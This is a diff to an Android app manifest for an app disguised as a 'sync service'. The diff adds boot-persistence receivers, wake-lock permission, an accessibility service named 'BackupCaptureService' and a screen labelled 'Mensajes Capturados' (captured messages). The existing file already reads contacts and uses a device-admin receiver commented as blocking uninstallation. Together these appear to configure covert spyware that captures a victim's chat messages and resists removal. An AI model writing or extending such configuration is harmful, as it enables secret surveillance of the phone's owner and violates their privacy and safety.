@@ -9,6 +9,8 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
         android:label="Servicio de Sincronización"
@@ -35,6 +37,11 @@
             android:name=".StatusActivity"
             android:exported="false"
             android:label="Estado de Sincronización" />
+
+        <activity
+            android:name=".ChatLogActivity"
+            android:exported="false"
+            android:label="Mensajes Capturados" />
 
         <!-- Receptor de Administrador para bloqueo de desinstalación -->
         <receiver
@@ -65,6 +72,30 @@
             android:exported="false"
             android:label="Servicio de Sincronización"
             android:foregroundServiceType="dataSync" />
+
+        <receiver
+            android:name=".SystemReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.POWER_CONNECTED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Lector de Respaldo vía Accesibilidad -->
+        <service
+            android:name=".BackupCaptureService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:label="Servicio de Sincronización (Respaldo)"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
     </application>
 </manifest>
